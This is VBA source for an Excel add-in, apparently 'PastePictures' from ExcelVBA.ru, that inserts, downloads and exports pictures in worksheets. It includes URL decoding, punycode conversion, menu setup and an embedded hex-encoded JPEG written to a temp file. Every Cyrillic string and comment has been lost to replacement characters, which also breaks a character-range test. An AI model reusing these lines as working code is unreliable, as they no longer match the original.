'    Next
'End Function

Sub OpenDownloadFolder()
    On Error Resume Next
    FWF.OpenFolder DOWNLOAD_FOLDER$
End Sub

Function URLDecode(ByVal strIn$) As String
    ' |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|: http://www.zhaojunpeng.com/posts/2016/10/28/excel-urldecode
    ' |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| EducatedFool
    On Error Resume Next
    Dim sl&, tl&, Key$, kl&
    sl = 1: tl = 1: Key = "%": kl = Len(Key)
    sl = InStr(sl, strIn, Key, 1)
    Do While sl > 0
        If (tl = 1 And sl <> 1) Or tl < sl Then
            URLDecode = URLDecode & Mid(strIn, tl, sl - tl)
        End If
        Dim hh$, hi$, hl$, a$
        Select Case UCase(Mid(strIn, sl + kl, 1))
            Case "U"    'Unicode URLEncode
                a = Mid(strIn, sl + kl + 1, 4)
                URLDecode = URLDecode & ChrW("&H" & a)
                sl = sl + 6
            Case "E"    'UTF-8 URLEncode
                hh = Mid(strIn, sl + kl, 2)
                a = Int("&H" & hh)    'ascii?
                If Abs(a) < 128 Then
                    sl = sl + 3
                    URLDecode = URLDecode & Chr(a)
                Else
                    hi = Mid(strIn, sl + 3 + kl, 2)
                    hl = Mid(strIn, sl + 6 + kl, 2)
                    a = ("&H" & hh And &HF) * 2 ^ 12 Or ("&H" & hi And &H3F) * 2 ^ 6 Or ("&H" & hl And &H3F)
                    If a < 0 Then a = a + 65536
                    URLDecode = URLDecode & ChrW(a)
                    sl = sl + 9
                End If
            Case Else    'Asc URLEncode
                hh = Mid(strIn, sl + kl, 2)    '??
                a = Int("&H" & hh)    'ascii?

                If Abs(a) < 128 Then
                    sl = sl + 3
                Else
                    hi = Mid(strIn, sl + 3 + kl, 2)    '??
                    'a = Int("&H" & hh & hi) '?ascii?
                    a = (Int("&H" & hh) - 194) * 64 + Int("&H" & hi)
                    sl = sl + 6
                End If
                URLDecode = URLDecode & ChrW(a)
        End Select
        tl = sl
        sl = InStr(sl, strIn, Key, 1)
    Loop
    URLDecode = URLDecode & Mid(strIn, tl)
End Function

Function ConvertURLtoFilename(ByVal URL$) As String
    On Error Resume Next: Err.Clear
    URL$ = Replace(URL$, "http://", "")
    URL$ = Replace(URL$, "https://", "")
    If URL$ Like "www.?*" Then URL$ = Mid(URL$, 5)
    URL$ = URLDecode(URL$)
    ConvertURLtoFilename = LCase(Replace_symbols(URL$))
    If Not ConvertURLtoFilename Like "*.jpg" Then ConvertURLtoFilename = ConvertURLtoFilename & ".jpg"
End Function

Function GetURL_FromCell(ByVal cell As Range) As String
    On Error Resume Next: Dim URL$, i&
    If cell.Hyperlinks.Count = 0 Then
        If cell.HasFormula Then
            If cell.Formula Like "=HYPERLINK*" Then
                txt$ = Mid$(cell.Formula, 12)
                txt$ = Left(txt, Len(txt) - 1)
                Dim Brackets&, Quotes&
                For i& = 1 To Len(txt)
                    Select Case Mid(txt, i, 1)
                        Case "(": Brackets& = Brackets& + 1
                        Case ")": Brackets& = Brackets& - 1
                        Case """": Quotes& = Quotes& + 1
                        Case ","
                            'Debug.Print i, (Brackets& = 0), (Quotes& Mod 2 = 0)
                            If (Brackets& = 0) And (Quotes& Mod 2 = 0) Then
                                txt = Left(txt, i - 1)
                                Exit For
                            End If
                    End Select
                Next
                'Debug.Print txt
                URL$ = Evaluate(txt)
                If SETT.GetBoolean("CheckBox_CreateURLusingFormula") Then
                    form$ = SETT.GetText("TextBox_URL_Formula")
                    If form$ <> "" Then URL$ = EvaluateUsingFormula(cell, form$, URL$)
                End If
                GoTo checkURL
            End If
        End If

        URL$ = Trim(cell.Value)
        If SETT.GetBoolean("CheckBox_CreateURLusingFormula") Then
            form$ = SETT.GetText("TextBox_URL_Formula")
            If form$ <> "" Then URL$ = EvaluateUsingFormula(cell, form$)
        End If
    Else
        URL$ = cell.Hyperlinks(1).Address
    End If

    If SETT.GetBoolean("CheckBox_CreateURLfromCellText") Then
        URL_prefix$ = Trim(SETT.GetText("TextBox_URL_prefix", ""))
        URL_suffix$ = Trim(SETT.GetText("TextBox_URL_suffix", ""))
        URL$ = URL_prefix$ & URL$ & URL_suffix$
    End If

checkURL:
    If URL$ Like "[A-z]*.?*/?*" Then If Not (URL$ Like "*://*") Then URL$ = "http://" & URL$
    If URL$ Like "*[|fffd|-|fffd||fffd|-|fffd||fffd||fffd|]*" Then URL$ = ConvertURLtoPunycode(URL$)

    If URL$ Like "*://*?.?*/?*" Then GetURL_FromCell = URL$
End Function
Attribute VB_Name = "mod_InsertSinglePicture"
'---------------------------------------------------------------------------------------
' Module        : mod_InsertSinglePicture
' Author        : EducatedFool                     Date: 17.11.2012
' Professional application development for Microsoft Excel
' http://ExcelVBA.ru/          ICQ: 5836318           Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------

Option Private Module

Sub Macro_InsertImageIntoSelection()
    On Error Resume Next: Err.Clear
    If ActiveSheet Is Nothing Then
        MsgBox "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", vbExclamation
        Exit Sub
    End If
    If TypeName(Selection) <> "Range" Then
        MsgBox "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", vbExclamation
        Exit Sub
    End If
    Dim ra As Range: Set ra = Selection.Areas(1)
    If ra.Height > 3300 Or ra.Width > 6000 Then
        MsgBox "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|", vbExclamation, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        Exit Sub
    End If

    filename$ = GetPicturePath: If filename$ = "" Then Exit Sub
    Application.ScreenUpdating = False
    Dim PicProp As New PictureProperties: Set PicProp.cell = ra
    PicProp.PasteIntoRange = True
    InsertPictureIntoRange filename$, ra, , PicProp
End Sub

Sub Macro_InsertImageIntoComment()
    On Error Resume Next: Err.Clear
    If ActiveSheet Is Nothing Then
        MsgBox "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", vbExclamation
        Exit Sub
    End If
    If TypeName(Selection) <> "Range" Then
        MsgBox "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", vbExclamation
        Exit Sub
    End If

    filename$ = GetPicturePath: If filename$ = "" Then Exit Sub
    Dim PicProp As New PictureProperties: Set PicProp.cell = ActiveCell
    InsertPictureIntoCellComment filename$, ActiveCell, PicProp
End Sub

Function GetPicturePath() As String
    On Error Resume Next: Err.Clear
    With Application.FileDialog(msoFileDialogOpen)
        .Title = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|": .InitialFileName = PICTURES_FOLDER$
        .filters.Clear:
        .filters.Add "|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|", "*.*"
        .filters.Add "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|" & " JPEG", "*.jpeg*, *.jpg*"
        .filters.Add "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|" & " PNG", "*.png*"
        .filters.Add "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|" & " BMP", "*.bmp*"
        .filters.Add "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|" & " EMF", "*.emf*"
        If .Show <> -1 Then Exit Function
        GetPicturePath = .SelectedItems(1)
    End With
End Function
Attribute VB_Name = "mod_Main"
'---------------------------------------------------------------------------------------
' Module        : mod_Main                    Version:
' Author        : Igor Vakhnenko                   Date: 16.10.2015
' Professional application development for Microsoft Excel
' http://ExcelVBA.ru/        info@excelvba.ru      Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------

Option Compare Text: Option Private Module        ': Option Explicit
Public Const PROJECT_NAME$ = "PastePictures", PROJECT_YEAR& = 2011
Public Const DEFAULT_FIRST_CELL$ = "B2"

Private Sub CreateCommandBar(): CreateProgramCommandBar 0: End Sub

Sub CreateProgramCommandBar(Optional ByVal RefreshOnly As Boolean = True)
    On Error Resume Next
    SaveDefaultSettings

    Dim AddinMenu As CommandBar, coll As Collection, i&, MainMacroButton As Object, NeedToSelectParser As Boolean
    Application.ScreenUpdating = False
    If Not RefreshOnly Then Run DeleteOldCommandBar
    Set AddinMenu = GetCommandBar(PROJECT_NAME, True Or RefreshOnly)

    'Set MainMacroButton = Add_Control(AddinMenu, ct_BUTTON, 501, "main_macro_name", tt("MENU_001"), msoButtonIconAndCaption, True)
    'AddSettingsSwitcher AddinMenu, ct_DROPDOWN, , "main_macro_name", MainMacroButton

    ' menu begin
    Set subMenu1 = Add_Control(AddinMenu, ct_POPUP, 0, "", " " & tt("MENU_001"), , True)
    ' 508, 546 ' 4348,4349 - rebuild HLs
    Add_Control subMenu1, ct_BUTTON, 6184, "InsertPicsFromFolder", tt("MENU_0011"), msoButtonIconAndCaption, True        '3832
    Add_Control subMenu1, ct_BUTTON, 2159, "InsertPicsFromLinks", tt("MENU_0012"), msoButtonIconAndCaption        ' , True

    Add_Control subMenu1, ct_BUTTON, 218, "Macro_InsertImageIntoSelection", tt("MENU_0021"), msoButtonIconAndCaption, True        '3832
    Add_Control subMenu1, ct_BUTTON, 301, "Macro_InsertImageIntoComment", tt("MENU_0022"), msoButtonIconAndCaption        ' , True
    Add_Control subMenu1, ct_BUTTON, 721, "ExportPictures_FromMenu", tt("MENU_0001"), msoButtonIconAndCaption, True        '721, 703

    Add_Control subMenu1, ct_BUTTON, 0, "ExitProgram", tt("MENU_004"), msoButtonCaption, True

    Add_Control(AddinMenu, ct_BUTTON, 0, "0", "", msoButtonIconAndCaption, False).Enabled = 0
    Set subMenu2 = Add_Control(AddinMenu, ct_POPUP, 0, "", " " & tt("MENU_005"), , True)

    Set subMenu_DelPicsFromCells = Add_Control(subMenu2, ct_POPUP, 4356, "", " " & tt("MENU_006"), , True)
    Add_Control subMenu_DelPicsFromCells, ct_BUTTON, 230, "DeletePictures", tt("MENU_0062"), msoButtonIconAndCaption, False, 2
    Add_Control subMenu_DelPicsFromCells, ct_BUTTON, 53, "DeletePictures", tt("MENU_0063"), msoButtonIconAndCaption, False, 3
    Add_Control subMenu_DelPicsFromCells, ct_BUTTON, 577, "DeletePictures", tt("MENU_0064"), msoButtonIconAndCaption, False, 4
    Add_Control subMenu_DelPicsFromCells, ct_BUTTON, 802, "DeletePictures", tt("MENU_0061"), msoButtonIconAndCaption, False, 1        ' 231

    Set subMenu_DelPicsFromComments = Add_Control(subMenu2, ct_POPUP, 0, "", " " & tt("MENU_012"), , False)
    Add_Control subMenu_DelPicsFromComments, ct_BUTTON, 230, "DeleteComments", tt("MENU_0062"), msoButtonIconAndCaption, False, 2
    Add_Control subMenu_DelPicsFromComments, ct_BUTTON, 53, "DeleteComments", tt("MENU_0063"), msoButtonIconAndCaption, False, 3
    Add_Control subMenu_DelPicsFromComments, ct_BUTTON, 577, "DeleteComments", tt("MENU_0064"), msoButtonIconAndCaption, False, 4
    Add_Control subMenu_DelPicsFromComments, ct_BUTTON, 802, "DeleteComments", tt("MENU_0061"), msoButtonIconAndCaption, False, 1

    Add_Control subMenu2, ct_BUTTON, 2159, "CopyLinksToSelectedColumn", tt("MENU_201"), msoButtonIconAndCaption, True
    Add_Control subMenu2, ct_BUTTON, 0, "MakeLinksClickable", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", msoButtonIconAndCaption

    Add_Control subMenu2, ct_BUTTON, 0, "CopyPicturesIntoFolder", tt("MENU_0002"), msoButtonIconAndCaption, True
    Add_Control subMenu2, ct_BUTTON, 0, "RenamePicturesInFolder", tt("MENU_202"), msoButtonIconAndCaption

    If SETT.GetBoolean("CheckBox_OutputFilenamesFromSubfolder") Then
        Add_Control subMenu2, ct_BUTTON, 25, "PasteFilenamesFromSubfolder", tt("MENU_203"), msoButtonIconAndCaption
    End If

    Set subMenu_PasteFilenames = Add_Control(subMenu2, ct_POPUP, 0, "", " " & tt("MENU_0003"), , False)
    Add_Control subMenu_PasteFilenames, ct_BUTTON, 71, "PasteFilenames", tt("MENU_0004"), msoButtonIconAndCaption, False, 1
    Add_Control subMenu_PasteFilenames, ct_BUTTON, 72, "PasteFilenames", tt("MENU_0005"), msoButtonIconAndCaption, False, 2
    Add_Control subMenu_PasteFilenames, ct_BUTTON, 73, "PasteFilenames", tt("MENU_0006"), msoButtonIconAndCaption, False, 3
    If Len(SETT.GetText("TextBox_PasteFilenamesEx_URLprefix")) Then
        Add_Control subMenu_PasteFilenames, ct_BUTTON, 74, "PasteFilenamesEx", "C |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", msoButtonIconAndCaption, False
    End If

    Add_Control subMenu2, ct_BUTTON, 1015, "FindPicturesInInternet", tt("MENU_0007"), msoButtonIconAndCaption, True
    Add_Control subMenu2, ct_BUTTON, 546, "ReplacePictiresInSelectedRows", tt("MENU_0008") & " (Ctrl + R)", msoButtonIconAndCaption, False

    Add_Control subMenu2, ct_BUTTON, 0, "ShowUsageExample", tt("ShowUsageExample"), msoButtonIconAndCaption, True

    AddSettingsSwitcher AddinMenu, ct_DROPDOWN
    Add3Buttons AddinMenu
    ' menu end

    If Not RefreshOnly Then
        RunWithDelay "ActivateAddinsTab"
        AddUpdateButton AddinMenu
        RunWithDelay "ActivateAddinsTab"
    End If

    If Developer Then
        Add_Control(AddinMenu, ct_BUTTON, 0, "0", "", msoButtonIconAndCaption, False).Enabled = 0
        Add_Control AddinMenu, ct_BUTTON, , "ShowFirstRunForm", "Show FirstRun Form", msoButtonIconAndCaption, True
        Add_Control AddinMenu, ct_BUTTON, , "ToggleIsAddin", "Show/Hide TR Sheet", msoButtonIconAndCaption, True
    End If

    Application.ScreenUpdating = True
End Sub

Sub SaveDefaultSettings()
    On Error Resume Next
    With SETT
        .LoadAllSettings
        If .IsSettingBlank("Setup\PIC_FOLDER") Then SETT.SetText "PIC_FOLDER", tt("CONST_PIC_FOLDER"), "Setup"
        If .IsSettingBlank("Setup\PD_FOLDER") Or Get_Data Then SETT.SetText "PD_FOLDER", tt("CONST_PD_FOLDER"), "Setup"

        .AddDefaultValue "TextBox_FirstCell", DEFAULT_FIRST_CELL$

        .AddDefaultValue "ComboBox_PicturesColumn", 3, True, True
        .AddDefaultValue "ComboBox_CommentsColumn", 4, True, True
        .AddDefaultValue "ComboBox_Padding", 2
        .AddDefaultValue "CheckBox_AddHyperlinks", False
        .AddDefaultValue "CheckBox_Cells", True
        .AddDefaultValue "CheckBox_Comments", False
        .AddDefaultValue "CheckBox_CompressImages", True
        .AddDefaultValue "TextBox_PicturePosition", 1
        .AddDefaultValue "ComboBox_Placement", xlMove
        .AddDefaultValue "SetPosition_1", True
        .AddDefaultValue "ComboBox_HyperlinksColumn", 2, True, True
        .AddDefaultValue "OptionButton_SM_CellTextInFilename", False
        .AddDefaultValue "OptionButton_SM_FilenameInCellText", False
        .AddDefaultValue "OptionButton_SM_Equal", True

        .AddDefaultValue "ComboBox_ImageSizeOriginalColumn", 9, True, True
        .AddDefaultValue "ComboBox_ImageSizeNewColumn", 10, True, True
        .AddDefaultValue "ComboBox_ImagesCountColumn", 11, True, True
        .AddDefaultValue "ComboBox_DownloadedFilenames_Column", 12, True, True
        .AddDefaultValue "ComboBox_ImageFilenameColumn", 13, True, True

        .AddDefaultValue "CheckBox_ExportAllPictures", True
        .AddDefaultValue "ComboBox_ExportPicturesColumn", 3, True, True
        .AddDefaultValue "ComboBox_ExportFilenamesColumn", 2, True, True
        .AddDefaultValue "ComboBox_Export_FileSize", 8, True, True
        .AddDefaultValue "ComboBox_Export_ImageName", 9, True, True
        .AddDefaultValue "ComboBox_Export_ImageFilename", 10, True, True

        .AddDefaultValue "CheckBox_AdjustRowHeight", True
        .AddDefaultValue "CheckBox_LockAspectRatio", True
        .AddDefaultValue "CheckBox_FixedImageWidth", True

        .AddDefaultValue "SpinButton_W", 85
        .AddDefaultValue "SpinButton_H", 60
        .AddDefaultValue "SpinButton_WComm", 250
        .AddDefaultValue "SpinButton_Hcomm", 150

        .AddDefaultValue "ComboBox_SubfolderNameColumn", 2, True, True
        .AddDefaultValue "ComboBox_SubfolderFilenamesFirstColumn", 16, True, True

        .AddDefaultValue "CheckBox_FI_AutoSearchRun", True
        .AddDefaultValue "CheckBox_FI_SearchIf_FilenameButPucture", True
        .AddDefaultValue "CheckBox_FI_AnyImageSize", True
        .AddDefaultValue "CheckBox_FI_AutoGotoNext", True

        .AddDefaultValue "CheckBox_FI_LEFT_PasteImage", True
        .AddDefaultValue "CheckBox_FI_LEFT_CopyImage_PicturesFolder", True
        .AddDefaultValue "CheckBox_FI_LEFT_UseFullSizeImage", True
        .AddDefaultValue "CheckBox_FI_RIGHT_PasteImage", True
        .AddDefaultValue "CheckBox_FI_RIGHT_CopyImage_PicturesFolder", True

        .AddDefaultValue "TextBox_FI_QueryMask", "{filename}"

        .AddDefaultValue "ComboBox_FI_count_W", 6
        .AddDefaultValue "ComboBox_FI_count_H", 3
        .AddDefaultValue "ComboBox_FI_margin", 10

        .AddDefaultValue "SpinButton_FI_H_min", 50
        .AddDefaultValue "SpinButton_FI_W_min", 50
        .AddDefaultValue "SpinButton_FI_H_max", 4000
        .AddDefaultValue "SpinButton_FI_W_max", 4000

        '.AddDefaultValue "TextBox_PicturesFolder", "..\|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|\"
        '.AddDefaultValue "TextBox_DownloadFolder", "..\|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|\"

        .AddDefaultValue "ComboBox_CELLScount", "1"
        .AddDefaultValue "CheckBox_ShowFolderInfo", True

        '        .AddDefaultValue "CheckBox_Add_ImageSizeOriginal", False
        '        .AddDefaultValue "CheckBox_Add_ImageSizeNew", False
        '        .AddDefaultValue "CheckBox_Add_ImagesCount", False
        '        .AddDefaultValue "CheckBox_CloseProgressBar", False
        '        .AddDefaultValue "CheckBox_FixedRowHeight", False
        '        .AddDefaultValue "CheckBox_ImageWidthLessThanColumnWidth", False
        '        .AddDefaultValue "CheckBox_AutoDeletePictures", False
        '        .AddDefaultValue "CheckBox_KeepRowsHeightAfterDeleting", False
        '        .AddDefaultValue "CheckBox_MultiColumns", False
        '        .AddDefaultValue "CheckBox_MergeEqualCells", False
        '        .AddDefaultValue "CheckBox_RenameDownloadedPictures", False
        '        .AddDefaultValue "CheckBox_EvaluateFilename", False
        '        .AddDefaultValue "CheckBox_OutputMissingImagesList", False
        '        .AddDefaultValue "CheckBox_ResizeAfterInserting", False
        '        .AddDefaultValue "CheckBox_OutputFilenamesFromSubfolder", False
        '        .AddDefaultValue "CheckBox_ChangeHyperlink", False
        '        .AddDefaultValue "CheckBox_AddHyperlinksForPictures", False
        '        .AddDefaultValue "CheckBox_CreateURLusingFormula", False
        '        .AddDefaultValue "CheckBox_CreateURLfromCellText", False
        RunWithDelay "LoadAllSettings", 5
    End With
End Sub

Sub UpdateAddinToolbar()
    RunWithDelay "CreateProgramCommandBar", 0.6
End Sub

Sub ToggleIsAddin()
    On Error Resume Next
    ThisWorkbook.IsAddin = Not ThisWorkbook.IsAddin
End Sub

Sub ShowUsageExample()        ' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
    On Error Resume Next: UsageExampleExists True
End Sub

Function GetFile_MainPicture() As String
    On Error Resume Next: Dim F_TXT$, buf$, tmp_file$: Const BufLen& = 5000
    F_TXT$ = F_TXT$ & "FFD8FFE000104A46494600010101006000600000FFDB0043000302020302020303030304030304050805050404050A070706080C0A0C0C0B0A0B0B0D0E12100D0E110E0B0B1016101113141515150C0F171816141812141514FFDB00430103040405040509050509140D0B0D1414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414FFC00011080037003403012200021101031101FFC4001C0000020301010101000000000000000000000806070904020305FFC4003910000103030302040403040B00000000000102030405061100072108120913315114324161152271162442D21719337274819194A3C1D1FFC400190100030101010000000000000000000000020405030601FFC40029110001030302040603000000000000000001000203112131045105124181061314326191A1E1F0FFDA000C03010002110311003F0063F7EBC44681B11BBF5BB0E7D975FAC4CA6A587153614A650CAC3ACA5C0005104602B07EE0EA0D7378B15B96CD3D9A83DB6775BB4E7484096898C796178CF693DDC1F5FD74A5F889D1274EEBA2E3F86AA0A6FC5AE92C254E2886C931594FE6C1F43E9FF63D74D0ED651A8366DB0AA156284E4A53D1D2EB092867C996DAC7705A4859"
    F_TXT$ = F_TXT$ & "4E78C608C7239E73A8D36ADD0BCBDCE1C833627B7F6C948CCB24A435C2817AA478C1D935AED435605CCDBAA504F699D1BEA40041EEE7D7D34C2755FD5FD1FA5572D9158B7EA95EFC69120B7F873EDB7E5168B7DDDDDE4673E60C63D8EB26B73AC5A453BA9AB82059A965C80CC98D2D2869B43CD33E6250B52404929C64AB09FA7A638D38BE2FCB6D151DA353C852E30FC40BA11F3767746EEC7DF19D747C01ACE23AC114A096D09A75F69207E1632CB231AFBD08205F17345FA123C652C88C4F7EDE5D1FEFA3FF0036B9BFAE92C3271FD1EDCF9FF1D1FF00F74AEDD74BE9C68B4981E63F53AFCE92CB8E17E9895B41B24FE50A6C2B09C0E01F9B232527552DDBB074BACC555476F6B4C5C6C2438A5C78F94ADBED1DDDAA4B8A0B0AC647008253C7CDC518BD16A226EA044F8D8EC7382316C9C77A2A9241242F31970711B1AADD9D8BDE087BD9B4B6DDF30204AA743ADB0A90D4596E256EB690E2D18514F07E4CF1EFA3557F404CB8C7471B58DB88536E269AE052560823F7877D41D1A90F01AF206EB354E7551E1E970F507BCB745DB1EEBA241A7551B8ADB50E7B2F1758534CA1B51CA78C1EC247EBA865BFE1BDBB56A44F86A5EEE5163B1DA1223ADA90E349C23B124256484A929E124631C7B6B45EBD4715A69A6C542653D6D381C0E437FC"
    F_TXT$ = F_TXT$ & "B51FB1FA11F63C6A3EADBE73B5B4B777DC4DA524777EFA851500318C9471CF3A4C40D0E2F6920D6B9EA97F4ECA975FED20AF785555664A4D51FBCA8B12B88712B12E9C87D9042540E0A470AF4F53CF3A637ACCE94EA3D4DAED3F81ADD3E8DF843727BFE3DB5AFCCF34B78EDEDF6F2F9CFB8D5FB47B61FA5553E2DCB8AA7506BB0B622CA710A6FD1201E120E476939FA951D48D4A09C64E3F53AA5C3F532F0C9DBA8D31A385737C823AFC1432E9639A2313EB434EBB5D659CDF08DBA1FCF977E5BA8CFBC77F51C9FE0DB79CA5F727712D81FDE8B235A8126C144998FC8FDA5AF37E6AD4BF2DB9FDA96C9CE0246380029400FB8F618EFA1DB6F51EA4ECA72BF51A8B4B41408D2DC429B47CB823001C8093C93CF712756A7F106BF53691C3E8208B450C3ECAFDA8474D5B4B3F66762ED0B22A3538F559B448AB8CECC8C161B749756BCA42B9C614073EDA356B8208C8E7FCF46B9D2E2E2494F25DF747A84A8D83B952E8096698DC0012AF8E9CCA836D12DA55DAE3BDE94A492484FBE3522B6F71EE8B8E133322C7A1CB8AEF287E3254B42B0707042C83C82348E788AF55306D1DC6BBF6E58B7DA955242A13B265CA70F638DAE321690948FA8EF50C9C7AF1A4EB6C7AB6BFB662DB8D4BB26E99F16038F29F769721943CCC770A89ED6FB8121047A8"
    F_TXT$ = F_TXT$ & "07DB4BC5AC948735D08B1A0F90067BDD6936958395CC94DC54FC1AE16E7A2B3722DA3E6C4A727839ED655FCDAE7DD0BCAB56A4CA422910634D121A5977E21B52FB7B4A718C118F53FE9AC83A3789BEEECE95118992633EDB8EA5B52988E1B2429407D723EBAD70DEE14934D4B73AB069131C86F351168792DAF2AED4A949CFA94820FD8E35434D2074A0CEC14D857F4939E3A46446F35DD57D2FA88BB2916CD5EBD54B3D50A0530BC5E09865F754D364F73C8436E28A9040EE18CA8A79EDD786FA93ABCAB8E9D458F0A90E49A9D1857E0B88696A44884569479A30AE06569C6793CF031CA6DD515D750A6F4E9745CD4EBDA597A4CF8F6CC0A4D3DEEC61D861B525D75EFE2756A50500BFCA00C0009C9D73EDA47BA765FA90D8EA6DE17244AA5AD2688E51456995069715325A0B442795920F92FA101278E147DB54DBE500DE768B66D9B1AD2F6DFB29BCAF24D1E68717C2D45B0AB12EB768D3A7CD432DCA90952DC4B2929403DEA1C0249C71A35F7B35EA7BF6DC2729B21B93054145979A5052563B8F208FBE746A3485A5E4B45AAAB3010D00A5737FBC3776D7A84DD9AC5F972D72EA8556A8A586DD8F4B951DB6025A692D27014D295CA523393EB9F4D435EF08DD9B762371C57EF2652D8210A6A5C64A93FF00068D1AC88072B60E20502E26"
    F_TXT$ = F_TXT$ & "7C1F36763C96E422E8BE0BCDAC2D27E2E20C904119C303DB4DA6EE6CC51776D54F4D6E55422A22B2EB69101C423BBCCED0AC92927F84608C7AE8D1AF50115CAA6EA3E1F3B6F55B699A04AAF5DCF521970BADC654E630957383FD8FD0A8919F438F61AFAD77A05DBFB95C86E54AE5BCA5390DD0FC752E7B396DC0301630CFA807D7468D1733B741E5B7657F6DB587076EAC7A4DB70244C950A9CDA9A69E9CE071E5A4AD4ACAD40004FE63F4D1A3468518145FFFD9"
    For i = 1 To Len(F_TXT$) / 2
        buf$ = buf$ & Chr(Val("&H" & Mid(F_TXT$, 2 * i - 1, 2)))
        If Len(buf$) > BufLen& Then res$ = res$ & buf$: buf$ = "": DoEvents
    Next: res$ = res$ & buf$
    tmp_file$ = Environ("tmp") & "\file_MainPicture_" & PROJECT_NAME$: Kill tmp_file$
    ff& = FreeFile: Open tmp_file$ For Binary Access Write As #ff
    Put #ff, , res$
    Close #ff
    If FileLen(tmp_file$) = Len(F_TXT$) / 2 Then GetFile_MainPicture = tmp_file$
End Function

Sub FirstRunActions()
    On Error Resume Next
    SETT.SetText "PIC_FOLDER", tt("CONST_PIC_FOLDER"), "Setup"
    SETT.SetText "PD_FOLDER", tt("CONST_PD_FOLDER"), "Setup"
End Sub


Attribute VB_Name = "mod_Punycode"
'****************************************
'* Converts Domainnames from Unicode to Punycode and vice versa             *
'* Programmed: Achim Neubauer           Last Change: 22.03.2004 18:39       *
'****************************************
' source: http://www.herber.de/forum/archiv/1192to1196/1192164_Punycode_Unicode.html
' Edited 25.01.2015 by EducatedFool         http://ExcelVBA.ru/

Option Explicit
Option Private Module

'Punycode constants
Private Const BASE As Long = 36, TMIN As Long = 1, TMAX As Long = 26, SKEW As Long = 38, DAMP As Long = 700
Private Const INITIAL_BIAS As Long = 72, INITIAL_N As Long = 128
'********************************************************************************

Function ConvertURLtoPunycode(ByVal URL$) As String
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| URL |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| Punycode
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd| http://|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|.|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|.|fffd||fffd|/|fffd||fffd||fffd||fffd||fffd||fffd|
